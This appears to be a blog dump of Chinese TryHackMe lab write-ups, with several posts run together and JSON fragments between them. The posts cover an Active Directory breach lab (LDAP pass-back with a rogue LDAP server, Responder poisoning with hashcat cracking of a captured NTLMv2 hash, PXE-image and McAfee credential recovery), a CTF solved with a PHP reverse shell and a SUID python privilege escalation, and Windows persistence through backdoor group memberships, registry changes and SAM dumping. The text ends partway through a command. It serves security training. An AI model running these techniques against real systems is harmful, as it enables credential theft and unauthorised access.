此函数将我们建议的密码和我们定位的 URL 作为输入，并尝试使用文本文件中的每个用户名对 URL 进行身份验证。通过监控应用程序的 HTTP 响应代码的差异，我们可以确定凭证对是否有效。如果凭证对有效，应用程序将使用 200 HTTP (OK) 代码进行响应。如果该对无效，应用程序将返回 401 HTTP（未经授权）代码。 按照提示我们运行py脚本：如下图，共发现四个有效凭据 0x04 LDAP 绑定凭证 LDAP 应用程序可以使用的另一种 AD 身份验证方法是轻量级目录访问协议 (LDAP) 身份验证。 LDAP 身份验证与 NTLM 身份验证类似。但是，通过 LDAP 身份验证，应用程序可以直接验证用户的凭据。该应用程序有一对 AD 凭据，可以首先使用它们来查询 LDAP，然后验证 AD 用户的凭据。 LDAP 身份验证是与 AD 集成的第三方（非 Microsoft）应用程序的一种流行机制。其中包括应用程序和系统，例如： Gitlab Jenkins Custom-developed web applications Printers VPNs 如果这些应用程序或服务中的任何一个在互联网上暴露，那么可以使用与针对 NTLM 认证系统使用的相同类型的攻击。但是，由于使用 LDAP 认证的服务需要一组 AD 凭据，因此它会打开额外的攻击途径。本质上，我们可以尝试恢复服务使用的 AD 凭据，以获得对 AD 的认证访问权限。通过 LDAP 进行身份验证的过程如下所示： 如果您可以在正确的主机（例如 Gitlab 服务器）上站稳脚跟，那么恢复这些 AD 凭据可能就像读取配置文件一样简单。这些凭证通常以纯文本形式存储在配置文件中，因为安全模型依赖于保持位置和存储配置文件的安全而不是其内容的安全。任务 7 中更深入地介绍了配置文件。 LDAP 回传攻击 然而，可以针对 LDAP 身份验证机制执行另一种非常有趣的攻击，称为 LDAP 回传攻击。当您获得对内部网络的初始访问权限（例如在会议室中插入恶意设备）时，这是针对网络设备（例如打印机）的常见攻击。 当我们访问指定 LDAP 参数的设备配置时，可以执行 LDAP 回传攻击。例如，这可以是网络打印机的 Web 界面。通常，这些接口的凭据保留为默认凭据，例如 admin:admin 或 admin:password 。在这里，我们无法直接提取 LDAP 凭据，因为密码通常是隐藏的。但是，我们可以更改 LDAP 配置，例如 LDAP 服务器的 IP 或主机名。在 LDAP 回传攻击中，我们可以将此 IP 修改为我们的 IP，然后测试 LDAP 配置，这将强制设备尝试对我们的恶意设备进行 LDAP 身份验证。我们可以拦截此身份验证尝试以恢复 LDAP 凭据。 执行 LDAP 回传 该网络中有一台网络打印机，管理网站甚至不需要凭据。导航至 http://printer.za.tryhackme.com/settings.aspx 以查找打印机的设置页面： 使用浏览器检查，我们还可以验证打印机网站是否至少足够安全，而不仅仅是将 LDAP 密码发送回浏览器： 所以我们有用户名，但没有密码。但是，当我们按测试设置时，我们可以看到向域控制器发出身份验证请求以测试 LDAP 凭据。让我们尝试利用此漏洞让打印机连接到我们，这会泄露凭据。为此，我们使用一个简单的 Netcat 侦听器来测试是否可以让打印机连接到我们。由于LDAP的默认端口是389，我们可以使用以下命令： nc -lvp 389 您应该看到我们恢复了连接，但有一个小问题： 您可能需要多次尝试才能接收回连接，但它应该会在 5 秒内做出响应。 supportedCapabilities 响应告诉我们遇到了问题。本质上，在打印机发送凭据之前，它会尝试协商 LDAP 身份验证方法详细信息。它将使用此协商来选择打印机和 LDAP 服务器都支持的最安全的身份验证方法。如果身份验证方法太安全，则凭据将不会以明文形式传输。对于某些身份验证方法，凭据根本不会通过网络传输！所以我们不能只使用普通的 Netcat 来获取凭据。我们需要创建一个恶意 LDAP 服务器并对其进行不安全的配置，以确保凭证以明文形式发送。 托管恶意 LDAP 服务器 有多种方法可以托管恶意 LDAP 服务器，但我们将在本示例中使用 OpenLDAP。如果您使用 AttackBox，则已经为您安装了 OpenLDAP。但是，如果您使用自己的攻击机器，则需要使用以下命令安装 OpenLDAP： apt-get update &amp;&amp; sudo apt-get -y install slapd ldap-utils &amp;&amp; sudo systemctl enable slapd 然而，您还必须在 攻击机 上配置您自己的恶意 LDAP 服务器。我们将首先使用以下命令重新配置 LDAP 服务器： dpkg-reconfigure -p low slapd 如果您想跳过服务器配置，请确保在请求时按&lt;否&gt;，具体配置参考：https://tryhackme.com/room/breachingad 在使用恶意 LDAP 服务器之前，我们需要通过降级支持的身份验证机制来使其容易受到攻击。我们希望确保我们的 LDAP 服务器仅支持 PLAIN 和 LOGIN 身份验证方法。为此，我们需要创建一个新的 ldif 文件，并使用以下内容进行调用： olcSaslSecProps.ldif dn: cn=config replace: olcSaslSecProps olcSaslSecProps: noanonymous,minssf=0,passcred 该文件具有以下属性： olcSaslSecProps：指定 SASL 安全属性 noanonymous：禁用支持匿名登录的机制 minssf：指定可接受的最小安全强度，0表示无保护。 现在我们可以使用 ldif 文件来修补我们的 LDAP 服务器，方法如下： ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif &amp;&amp; sudo service slapd restart 我们可以使用以下命令验证我们的恶意 LDAP 服务器的配置是否已应用（注意：如果您使用 Kali，您可能不会收到任何输出，但配置应该已生效，您可以继续执行后续步骤）： 捕获 LDAP 凭证 我们的恶意 LDAP 服务器现已配置完毕。当我们单击 http://printer.za.tryhackme.com/settings.aspx 上的“测试设置”时，身份验证将以明文形式进行。如果您正确配置了恶意 LDAP 服务器并且它正在降级通信，您将收到以下错误：“此专有名称包含无效语法”。如果收到此错误，您可以使用以下命令使用 tcpdump 来捕获凭据： tcpdump -SX -i breachad tcp port 389 另请注意， password11 是一个示例。您的服务密码将会不同。在 TCPdump 返回数据之前，您可能需要按几次“测试设置”按钮，因为我们是通过 VPN 连接执行攻击。 现在我们有了另一组有效的 AD 凭据！通过使用 LDAP 回传攻击并降级支持的身份验证机制，我们可以拦截明文形式的凭据。 0x05 身份验证中继 继续讨论可以从我们的恶意设备发起的攻击，我们现在将研究针对更广泛的网络身份验证协议的攻击。在Windows网络中，有大量的服务相互通信，允许用户利用网络提供的服务。 这些服务必须使用内置的身份验证方法来验证传入连接的身份。在任务 2 中，我们探索了 Web 应用程序上使用的 NTLM 身份验证。在此任务中，我们将更深入地了解从网络角度来看此身份验证的情况。但是，对于此任务，我们将重点关注 SMB 使用的 NetNTLM 身份验证。 服务器消息块 服务器消息块 (SMB) 协议允许客户端（如工作站）与服务器（如文件共享）进行通信。在使用 Microsoft AD 的网络中，SMB 负责管理从网络间文件共享到远程管理的所有事务。即使当您尝试打印文档时计算机收到的“缺纸”警报也是 SMB 协议的作用。 然而，早期版本的SMB协议安全性被认为是不足的。发现了几个漏洞和利用方式，可以利用它们来恢复凭据，甚至在设备上获得代码执行。尽管这些漏洞中的一些已在协议的更新版本中得到解决，但通常组织并不强制使用更新版本，因为旧系统不支持它们。我们将研究两种不同的利用方式，用于SMB的NetNTLM身份验证： 由于NTLM Challenges可以被拦截，我们可以使用离线破解技术来恢复与NTLM Challenge相关的密码。然而，这种破解过程比直接破解 NTLM 哈希要慢得多。 我们可以使用我们的恶意设备进行中间人攻击，中继客户端和服务器之间的SMB身份验证，这将为我们提供一个活动的已验证会话和对目标服务器的访问。 LLMNR, NBT-NS, and WPAD 在此任务中，我们将稍微了解一下使用 SMB 期间发生的身份验证。我们将使用 Responder 尝试拦截 NetNTLM 挑战来破解它。网络上通常有很多这样的挑战。一些安全解决方案甚至扫描整个 IP 范围以从主机恢复信息。有时，由于 DNS 记录过时，这些身份验证挑战最终可能会攻击您的恶意设备而不是目标主机。 Responder 允许我们通过在 NetNTLM 身份验证期间毒害响应来执行中间人攻击，欺骗客户端与您而不是他们想要连接的实际服务器进行对话。在真实 LAN 上，响应程序将尝试毒害检测到的任何链路本地多播名称解析 (LLMNR)、NetBIOS 名称服务 (NBT-NS) 和 Web 代理自动发现 (WPAD) 请求。在大型 Windows 网络上，这些协议允许主机为同一本地网络上的所有主机执行自己的本地 DNS 解析。主机可以首先尝试通过发送 LLMNR 请求并查看是否有主机响应来确定它们正在查找的主机是否位于同一本地网络上，而不是使 DNS 服务器等网络资源负担过重。 NBT-NS 是 LLMNR 的先驱协议，发出 WPAD 请求是为了尝试为未来的 HTTP(s) 连接找到代理。 由于这些协议依赖于在本地网络上广播的请求，因此我们的恶意设备也会收到这些请求。通常，这些请求会被简单地丢弃，因为它们不是针对我们的主机的。然而，响应者将主动侦听请求并发送有毒响应，告诉请求主机我们的 IP 与请求的主机名相关联。通过毒害这些请求，Responder 尝试强制客户端连接到我们的 AttackBox。在同一行中，它开始托管多个服务器，例如 SMB、HTTP、SQL 等，以捕获这些请求并强制进行身份验证。 拦截 NetNTLM 挑战 需要注意的一件事是，Responder 实质上试图通过毒害连接来赢得竞争条件，以确保您拦截连接。这意味着响应程序通常仅限于本地网络上的中毒身份验证质询。由于我们通过 VPN 连接到网络，因此我们只能破坏该 VPN 网络上发生的身份验证质询。为此，我们模拟了一个可能中毒的身份验证请求，每 30 分钟运行一次。这意味着您可能需要等待一段时间才能拦截 NetNTLM 质询和响应。 尽管 Responder 在从连接到组织 LAN 的恶意设备执行时能够拦截和毒害更多身份验证请求，但了解这种行为可能具有破坏性并因此被检测到至关重要。通过中毒身份验证请求，正常的网络身份验证尝试将失败，这意味着用户和服务将无法连接到他们想要连接的主机和共享。在安全评估中使用 Responder 时请记住这一点。 Responder 已安装在 AttackBox 上。但是，如果您不使用 AttackBox，则可以从此存储库下载并安装它：https://github.com/lgandx/Responder。我们将设置 Responder 在连接到 VPN 的接口上运行： responder -I breachad 如果您使用 AttackBox，则并非所有响应程序服务都能够启动，因为其他服务已在使用这些端口。但是，这不会影响此任务。 Responder 现在将侦听任何传入的 LLMNR、NBT-NS 或 WPAD 请求。我们会让 Responder 在真实 LAN 上运行一段时间。然而，在我们的例子中，我们必须通过让其中一台服务器尝试对 VPN 上的计算机进行身份验证来模拟这种中毒。让 Responder 运行一段时间（平均 10 分钟，呼吸一下新鲜空气！），您应该会收到一个 SMBv2 连接，Responder 可以使用该连接来吸引和提取 NTLMv2-SSP 响应。它看起来像这样： NTLM 密码喷射攻击 [+] Listening for events... [SMBv2] NTLMv2-SSP Client : &lt;Client IP&gt; [SMBv2] NTLMv2-SSP Username : ZA\\&lt;Service Account Username&gt; [SMBv2] NTLMv2-SSP Hash : &lt;Service Account Username&gt;::ZA:&lt;NTLMv2-SSP Hash&gt; 如果我们使用恶意设备，我们可能会运行 Responder 相当长的时间，捕获多个响应。一旦我们有了几个，我们就可以开始对响应执行一些离线破解，希望恢复它们关联的 NTLM 密码。如果账户配置了弱密码，我们就有很大的机会成功破解它们。将 NTLMv2-SSP 哈希复制到文本文件。然后，我们将使用可下载文件中提供的密码列表来执行此任务，并使用 Hashcat 尝试使用以下命令破解哈希： hashcat -m 5600 &lt;hash file&gt; &lt;password file&gt; --force 密码文件已在 AttackBox 的 /root/Rooms/BreachingAD/task5/ 目录中或作为可下载的任务文件提供给您。我们使用 hashtype 5600，它与 hashcat 的 NTLMv2-SSP 相对应。如果您使用自己的机器，则必须先安装 Hashcat。 我们可以破解的任何哈希现在都将为我们提供用于违规的 AD 凭据！ 传递挑战 然而，在某些情况下，我们可以更进一步，尝试传递挑战，而不是直接捕获挑战。如果事先不了解帐户，则执行此操作会有点困难，因为此攻击取决于关联帐户的权限。我们需要做一些对我们有利的事情： 应禁用或启用 SMB 签名，但不强制执行。当我们执行中继时，我们会对请求进行微小的更改以将其传递。如果启用了 SMB 签名，我们将无法伪造消息签名，这意味着服务器会拒绝它。 关联的帐户需要服务器上的相关权限才能访问所请求的资源。理想情况下，我们希望中继具有服务器管理权限的帐户的质询和响应，因为这将使我们能够在主机上立足。 由于我们在技术上还没有 AD 立足点，因此需要对哪些帐户对哪些主机拥有权限进行一些猜测。如果我们已经违反了 AD，我们可以先执行一些初始枚举，这通常是这种情况。 这就是盲接通常不流行的原因。理想情况下，您首先使用另一种方法破坏 AD，然后执行枚举以确定与您所破坏的帐户关联的权限。从这里，您通常可以执行横向移动以跨域进行权限升级。不过，从根本上了解一下中继攻击的工作原理还是很好的，如下图所示： 如果您想实际尝试这种类型的攻击，请前往 Holo Network。我们也会在以后的广告室中再次讨论这一点。 首先执行responder： 十分钟左右得到如下响应： svcFileCopy::ZA:b74c5cc6e5eaac51:E3C2C14AD0C8767E33B65AF91E87ABFE:0101000000000000803D5A817F5BDA01051BE47B70F1B4730000000002000800380059005500440001001E00570049004E002D00340055005500560035004C0036004E0046003800300004003400570049004E002D00340055005500560035004C0036004E004600380030002E0038005900550044002E004C004F00430041004C000300140038005900550044002E004C004F00430041004C000500140038005900550044002E004C004F00430041004C0007000800803D5A817F5BDA0106000400020000000800300030000000000000000000000000200000B439D5FE6702315673E604C277083A3E0C091CE1C8C49BBD1E05AB2FCAA4BD990A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00350030002E0038002E00310030000000000000000000 赋值其中的hash值到文件中，接着hashcat进行破解 一分钟左右得到结果： 箭头处为密码 0x06 Microsoft 部署工具包 大型组织需要工具来部署和管理资产的基础设施。在大型组织中，您无法让 IT 人员使用 DVD 甚至 USB 闪存驱动器在每台计算机上安装软件。幸运的是，微软已经提供了管理资产所需的工具。然而，我们也可以利用这些工具中的错误配置来破坏 AD。 MDT and SCCM Microsoft 部署工具包 (MDT) 是一项 Microsoft 服务，可帮助自动部署 Microsoft 操作系统 (OS)。大型组织使用 MDT 等服务来帮助更有效地在其资产中部署新映像，因为可以在中央位置维护和更新基础映像。 通常，MDT 与 Microsoft 的系统中心配置管理器 (SCCM) 集成，后者管理所有 Microsoft 应用程序、服务和操作系统的所有更新。 MDT 用于新部署。从本质上讲，它允许 IT 团队预配置和管理启动映像。因此，如果他们需要配置一台新机器，他们只需要插入网线，一切都会自动发生。他们可以对启动映像进行各种更改，例如已经安装 Office365 等默认软件和组织选择的防病毒软件。它还可以确保在安装第一次运行时更新新版本。 SCCM 几乎可以被视为 MDT 的扩展和老大哥。软件安装后会发生什么？嗯，SCCM 进行这种类型的补丁管理。它允许 IT 团队查看整个地产中安装的所有软件的可用更新。团队还可以在沙箱环境中测试这些补丁，以确保它们稳定，然后再将它们集中部署到所有加入域的计算机。它使 IT 团队的工作变得更加轻松。 然而，任何提供基础设施集中管理的东西（例如 MDT 和 SCCM）也可能成为攻击者的目标，试图接管该资产中的大部分关键功能。尽管可以通过多种方式配置 MDT，但对于此任务，我们将专门关注称为预启动执行环境 (PXE) 启动的配置。 PXE Boot 大型组织使用 PXE 引导来允许连接到网络的新设备直接通过网络连接加载和安装操作系统。 MDT 可用于创建、管理和托管 PXE 启动映像。 PXE 启动通常与 DHCP 集成，这意味着如果 DHCP 分配 IP 租约，则允许主机请求 PXE 启动映像并启动网络操作系统安装过程。通信流程如下图所示 执行该过程后，客户端将使用 TFTP 连接下载 PXE 启动映像。我们可以将 PXE 启动映像用于两个不同的目的： 注入权限升级向量（例如本地管理员帐户），以便在 PXE 启动完成后获得对操作系统的管理访问权限。 执行密码抓取攻击以恢复安装期间使用的 AD 凭据。 在本任务中，我们将重点关注后者。我们将尝试在安装过程中恢复与 MDT 服务关联的部署服务帐户，以应对此密码抓取攻击。此外，还可以检索用于无人值守安装应用程序和服务的其他 AD 帐户。 PXE Boot Image Retrieval 由于 DHCP 有点挑剔，我们将绕过此攻击的初始步骤。我们将跳过尝试从 DHCP 请求 IP 和 PXE 启动预配置详细信息的部分。我们将手动执行该过程中此步骤的其余攻击。 您通过 DHCP 收到的有关 PXE 启动预配置的第一条信息是 MDT 服务器的 IP。在我们的例子中，您可以从 TryHackMe 网络图中恢复该信息。 您收到的第二条信息是 BCD 文件的名称。这些文件存储与不同类型的体系结构的 PXE 引导相关的信息。要检索此信息，您需要连接到此网站：http://pxeboot.za.tryhackme.com。它将列出各种 BCD 文件： 通常，您将使用 TFTP 请求每个 BCD 文件并枚举所有文件的配置。不过，由于时间关系，我们将重点关注 x64 架构的 BCD 文件。复制并存储该文件的全名。在本练习的其余部分中，我们将使用此名称占位符 x64{7B...B3}.bcd ，因为 MDT 每天都会重新生成文件及其名称。每次看到此占位符时，请记住将其替换为您的特定 BCD 文件名。另请注意，如果网络刚刚启动，这些文件名将仅在网络处于活动状态 10 分钟后更新。 现在从 DHCP 恢复了初始信息（眨眼），我们可以枚举并检索 PXE 启动映像。在接下来的几个步骤中，我们将使用 THMJMP1 上的 SSH 连接，因此请使用以下命令对此 SSH 会话进行身份验证： ssh thm@THMJMP1.za.tryhackme.com 以及 Password1@ 的密码。 为了确保网络的所有用户都可以使用 SSH，首先使用您的用户名创建一个文件夹，并将 powerpxe 存储库复制到此文件夹中： C:\\Users\\THM&gt;cd Documents C:\\Users\\THM\\Documents&gt; mkdir hybcx C:\\Users\\THM\\Documents&gt; copy C:\\powerpxe hybcx\\ C:\\Users\\THM\\Documents\\&gt; cd hybcx 我们需要执行的第一步是使用 TFTP 并下载 BCD 文件来读取 MDT 服务器的配置。 TFTP 比 FTP 有点棘手，因为我们无法列出文件。相反，我们发送文件请求，服务器将通过 UDP 连接回我们以传输文件。因此，我们在指定文件和文件路径时需要准确。 BCD 文件始终位于 MDT 服务器上的 /Tmp/ 目录中。我们可以在 SSH 会话中使用以下命令启动 TFTP 传输： tftp -i 10.200.9.202 GET \"\\Tmp\\x64{E212701C-9A00-4A53-866C-F5DDD6C087D9}.bcd\" conf.bcd 您必须使用 nslookup thmmdt.za.tryhackme.com 查找 THMMDT IP。现在 BCD 文件已恢复，我们将使用 powerpxe 读取其内容。 Powerpxe 是一个 PowerShell 脚本，可自动执行此类攻击，但通常会产生不同的结果，因此最好执行手动方法。我们将使用 powerpxe 的 Get-WimFile 函数从 BCD 文件中恢复 PXE 启动映像的位置： powershell -executionpolicy bypass WIM 文件是 Windows 映像格式 (WIM) 的可启动映像。现在我们已经知道了 PXE 启动映像的位置，我们可以再次使用 TFTP 下载该映像： tftp -i 10.200.9.202 GET \"\\Boot\\x64\\Images\\LiteTouchPE_x64.wim\" pxeboot.wim 由于您正在下载完全可启动且已配置的 Windows 映像，因此此下载将需要一段时间。也许在等待的时候伸伸腿，喝杯水。 从 PXE 启动映像恢复凭证 现在我们已经恢复了 PXE 启动映像，我们可以窃取存储的凭据。应该指出的是，我们可以发起各种攻击。我们可以注入本地管理员用户，因此一旦映像启动，我们就具有管理员访问权限，我们可以安装映像以拥有加入域的计算机。如果您有兴趣了解有关这些攻击的更多信息，可以阅读本文。本次练习将重点关注尝试窃取凭据的简单攻击。 我们将再次使用 powerpxe 来恢复凭据，但您也可以通过提取映像并查找 bootstrap.ini 文件（通常存储这些类型的凭据）来手动执行此步骤。要使用 powerpxe 从引导文件恢复凭据，请运行以下命令： Get-FindCredentials -WimFile pxeboot.wim 如您所见，powerpxe 能够恢复 AD 凭据。我们现在有了另一组可以使用的 AD 凭据！ 0x07 配置文件 我们将在此网络中探索的最后一个枚举途径是配置文件。假设您足够幸运，造成了一次漏洞，使您能够访问组织网络上的主机。在这种情况下，配置文件是尝试恢复 AD 凭据的绝佳探索途径。根据被破坏的主机，各种配置文件可能具有枚举价值： Web 应用程序配置文件 服务配置文件 Registry keys 注册表项 集中部署的应用程序 可以使用多个枚举脚本（例如 Seatbelt）来自动执行此过程。 配置文件凭证 但是，在此任务中，我们将重点关注从集中部署的应用程序恢复凭据。通常，这些应用程序需要一种在安装和执行阶段对域进行身份验证的方法。此类应用程序的一个示例是 McAfee Enterprise Endpoint Security，组织可以将其用作端点检测和安全响应工具。 McAfee 将安装期间用于连接回 Orchestrator 的凭据嵌入名为 ma.db 的文件中。可以通过对主机的本地访问来检索和读取该数据库文件，以恢复关联的 AD 服务帐户。在本练习中，我们将再次使用 THMJMP1 上的 SSH 访问。 ma.db 文件存储在固定位置： 我们可以使用 SCP 将 ma.db 复制到我们的 AttackBox： scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db . 为了读取数据库文件，我们将使用一个名为 sqlitebrowser 的工具。我们可以使用以下命令打开数据库： sqlitebrowser ma.db 使用 sqlitebrowser，我们将选择“浏览数据”选项并关注 AGENT_REPOSITORIES 表： 我们对第二个条目特别感兴趣，重点是 DOMAIN、AUTH_USER 和 AUTH_PASSWD 字段条目。记下这些条目中存储的值。但是，AUTH_PASSWD 字段已加密。幸运的是，McAfee 使用已知密钥加密该字段。因此，我们将使用以下旧的 python2 脚本来解密密码。该脚本已作为可下载的任务文件或在 AttackBox 上提供，可以在 /root/Rooms/BreachingAD/task7/ 目录中找到。 注意：我们在这里使用的工具已经很旧了。它使用 Python v2 并依赖于旧的加密库。如果您无法让脚本在您自己的虚拟机上运行，​​请使用 AttackBox。不过，该应用程序最近进行了更新，以确保它也可以在 Python3 上运行，您可以在此处下载最新版本：https://github.com/funoverip/mcafee-sitelist-pwd-decryption 您必须解压缩 mcafee-sitelist-pwd-decryption.zip 文件，通过向脚本提供我们的 base64 编码和加密密码，该脚本将提供解密的密码： python3 mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q== 现在，我们再次拥有了一组 AD 凭据，可用于进一步枚举！这只是从配置文件恢复凭据的示例之一。如果您能够在主机上站稳脚跟，请务必遵循详细而完善的方法，以确保从主机恢复所有战利品，包括凭证和其他可以存储在配置文件中的敏感信息。 0x08 总结 可以通过大量的攻击途径来破坏 AD。我们介绍了该网络中红队演习期间常用的一些常用方法。由于攻击面的巨大，人们不断发现恢复第一组 AD 凭据的新途径。需要建立适当的枚举方法并不断更新它才能找到初始凭证对。 防御措施 在防御措施方面，组织可以采取一些步骤： 用户意识和培训 - 网络安全链中最薄弱的环节几乎总是用户。对用户进行培训，让他们意识到在泄露凭证等敏感信息时应小心谨慎，并且不要信任可疑电子邮件，从而减少这种攻击面。 限制在线 AD 服务和应用程序的暴露 - 并非所有应用程序都必须可通过 Internet 访问，尤其是那些支持 NTLM 和 LDAP 身份验证的应用程序。相反，这些应用程序应放置在可通过 VPN 访问的 Intranet 中。然后，VPN 可以支持多重身份验证以增强安全性。 实施网络访问控制 (NAC) - NAC 可以防止攻击者连接网络上的恶意设备。然而，这将需要相当多的努力，因为合法设备必须被列入白名单。 强制执行 SMB 签名 - 通过强制执行 SMB 签名，不可能进行 SMB 中继攻击。 遵循最小权限原则 - 在大多数情况下，攻击者将能够恢复一组 AD 凭据。通过遵循最小特权原则，特别是对于用于服务的凭证，可以显着降低与这些凭证被泄露相关的风险。 现在我们已经突破了 AD，下一步是执行 AD 的枚举，以更好地理解域结构并识别可被利用的潜在错误配置。这将在下一个房间中介绍。记得清除DNS配置！","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-RootMe","path":"/2024/02/08/thm-rootme/","content":"0x01 前言 第一次做THM的靶机，对渗透啥的思路不咋有，边做边学吧。 0x02 任务框架 部署机器-》侦查-》获取shell-》权限提升 0x03 靶机之旅 鉴于我是新手，前期就记录的详细一些，方便日后复盘。 nmap扫描 nmap -sS -sV -A -p 1-65535 10.10.92.95 这种扫描方式有亿点慢，以后看着换什么方式好（但很全） 端口信息如上，可以看到只开启了22与80端口 Gobuster扫目录 gobuster dir -u \"http://10.10.92.95/\" -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 接下来的任务是让我们拿到反向shell，那我们就访问一下web目录看看 访问Web目录 找寻一番，只发现panel这一目录可疑，文件上传点，这里我先是随便上传了个带马的PHP文件，发现被ban了，这时候没啥思路了，看了一下walkthrough： 结合shell的目的，估计就是上传带有反向shell的PHP脚本，连到我们的攻击机。脚本地址如下： https://github.com/pentestmonkey/php-reverse-shell 下载好之后，找到PHP文件，修改最终反弹的地址： 我们找到openvpn对应IP修改即可 使用以下命令使 php-reverse-shell 脚本可执行：chmod +x php_reverse_shell.php 文件上传漏洞 这里修改好之后就是上传文件了，可以看到上图上传的时候，显示的似乎是不允许PHP后缀的文件上传。其实这里测试几番我发现我自己是真的菜，学了很多绕过思路，到这里就无从下手，垃圾死了！！之后无奈看了wp发现他们利用了Apache解析漏洞，其实这里在nmap的时候就提示我们了，不过我心里感觉是不会有Apache漏洞的。。。。 不多说废话，我们可以尝试上传php5后缀、phtml或者解析漏洞：jpg.php 参考地址：https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload 这里我就用php5了，可以看到成功上传 接下来访问上传地址（页面有回显），访问uploads目录看看（这里我直接点了超链接进入到文件上传地址，不过我们也可以手动访问）如下图，点击即可 但要注意提前开启监听： 反弹shell 可以看到在点击文件之后，我们就拿到了shell，之后发现权限不够，肯定就是提权了。 题目也提示我们suid提权： suid提权 find / -user root -perm -4000 -print 2&gt;/dev/null 这里发现python比较可疑，进一步查看，如下图，含有权限s，意味着被设置了suid权限 那直接python提权即可：https://gtfobins.github.io/gtfobins/python/ python -c 'import os; os.system(\"/bin/sh\")' 成功提权 拿flag flag1 flag2 0x04 总结 至于suid提权，还需要进一步总结，这里就不赘述了。后续另起文章吧 总的来说这个靶机很基础，但对我确有难度~~，继续勉励！ 0x05 参考文章 RootMe CTF: TryHackMe A Beginner’s Guide to Capture the flag TryHackMe : RootMe CTF Writeup (Detailed) TryHackMe-RootMe Nmap 常用命令总结 2022蓝帽杯遇见的 SUID 提权 总结篇 浅谈linux suid提权","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-Windows本地持久性","path":"/2024/02/06/thm-windows-ben-di-chi-jiu-xing/","content":"0x01 简介 在目标的内部网络上获得第一个立足点后，您需要确保在真正获得皇冠上的宝石之前不会失去对它的访问权限。建立持久性是我们作为攻击者在获得网络访问权限时首先要做的任务之一。简而言之，持久性是指创建替代方法来重新获得对主机的访问权限，而无需再次经历利用阶段。 您希望尽快建立持久性的原因有很多，包括： 重新利用并不总是可能的：一些不稳定的利用可能会在利用过程中杀死易受攻击的进程，让您对其中一些进程进行一次攻击。 获得立足点很难重现：例如，如果您使用网络钓鱼活动来获得第一次访问权限，那么重复它来重新获得对主机的访问权限简直就是太多的工作。您的第二次营销活动也可能不会那么有效，导致您无法访问网络。 蓝队正在追捕您：如果您的操作被检测到，用于获得您首次访问权限的任何漏洞都可能会被修补。您正在与时间赛跑！ 虽然您可以保留某些管理员的密码哈希并重新使用它来重新连接，但您总是面临这些凭据在某些时候被轮换的风险。另外，还有一些更狡猾的方法可以让您重新获得对受感染机器的访问权，从而使蓝队的日子变得更加艰难。 0x02 本地持久性 拥有管理员凭据将是在计算机中实现持久性的最简单方法。然而，为了让蓝队更难检测到我们，我们可以操纵非特权用户（这些用户通常不会像管理员那样受到监控），并以某种方式授予他们管理权限。 请注意，我们假设您已经以某种方式获得了管理访问权限，并尝试从那里建立持久性。 2.1 篡改非特权账户 分配组成员资格 对于这部分任务，我们假设您已转储受害计算机的密码哈希值并成功破解了正在使用的非特权帐户的密码。 让非特权用户获得管理权限的直接方法是使其成为管理员组的一部分。我们可以使用以下命令轻松实现此目的： C:\\&gt; net localgroup administrators thmuser0 /add 这将允许您使用 RDP、WinRM 或任何其他可用的远程管理服务来访问服务器。 如果这看起来太可疑，您可以使用备份操作员组。该组中的用户没有管理权限，但可以读取/写入系统上的任何文件或注册表项，忽略任何配置的 DACL。这将使我们能够复制 SAM 和 SYSTEM 注册表配置单元的内容，然后我们可以使用它们来恢复所有用户的密码哈希值，从而使我们能够轻松升级到任何管理帐户。 为此，我们首先将该帐户添加到 Backup Operators 组： C:\\&gt; net localgroup \"Backup Operators\" thmuser1 /add 由于这是一个非特权帐户，因此它无法通过 RDP 或 WinRM 返回计算机，除非我们将其添加到远程桌面用户 (RDP) 或远程管理用户 (WinRM) 组。我们将使用 WinRM 来完成此任务： C:\\&gt; net localgroup \"Remote Management Users\" thmuser1 /add 我们假设我们已经将凭据转储到服务器上并拥有 thmuser1 的密码。让我们使用其凭据通过 WinRM 进行连接： 如果您现在尝试从攻击者计算机进行连接，您会惊讶地发现，即使您位于 Backups Operators 组中，您也无法按预期访问所有文件。快速检查我们分配的组将表明我们是备份操作员的一部分，但该组已被禁用： 这是由于用户帐户控制 (UAC)。 UAC 实现的功能之一是 LocalAccountTokenFilterPolicy，它会在远程登录时剥夺任何本地帐户的管理权限。虽然您可以通过 UAC 从图形用户会话提升您的权限（请在此处阅读有关 UAC 的更多信息），但如果您使用 WinRM，则您将被限制为没有管理权限的有限访问令牌。 为了能够从您的用户那里重新获得管理权限，我们必须通过将以下注册表项更改为 1 来禁用 LocalAccountTokenFilterPolicy： C:\\&gt; reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 一旦所有这些都设置完毕，我们就可以使用我们的后门用户了。首先，让我们建立一个 WinRM 连接并检查是否为我们的用户启用了 Backup Operators 组： 然后我们继续备份 SAM 和 SYSTEM 文件并将它们下载到我们的攻击者计算机上： 注意：如果 Evil-WinRM 下载文件的时间过长，请随意使用任何其他传输方法。 有了这些文件，我们可以使用 secretsdump.py 或其他类似工具转储所有用户的密码哈希值： 最后，执行 Pass-the-Hash 以使用管理员权限连接到受害计算机： 特殊权限和安全描述符 无需修改任何组成员身份即可实现与将用户添加到 Backup Operators 组类似的结果。特殊组之所以特殊，是因为操作系统默认为它们分配了特定的权限。权限只是在系统本身上执行任务的能力。它们包括简单的事情，例如能够关闭服务器的能力，以及非常特权的操作，例如能够获得系统上任何文件的所有权。您可以在此处找到可用权限的完整列表以供参考：here 对于 Backup Operators 组，默认分配有以下两个权限： SeBackupPrivilege：用户可以读取系统中的任何文件，忽略任何 DACL。 SeRestorePrivilege：用户可以写入系统中的任何文件，忽略任何 DACL。 我们可以将此类权限分配给任何用户，无论其组成员身份如何。为此，我们可以使用 secedit 命令。首先，我们将当前配置导出到临时文件： secedit /export /cfg config.inf 我们打开文件并将用户添加到有关 SeBackupPrivilege 和 SeRestorePrivilege 的配置行中： 我们最终将 .inf 文件转换为 .sdb 文件，然后使用该文件将配置加载回系统中： secedit /import /cfg config.inf /db config.sdb secedit /configure /db config.sdb /cfg 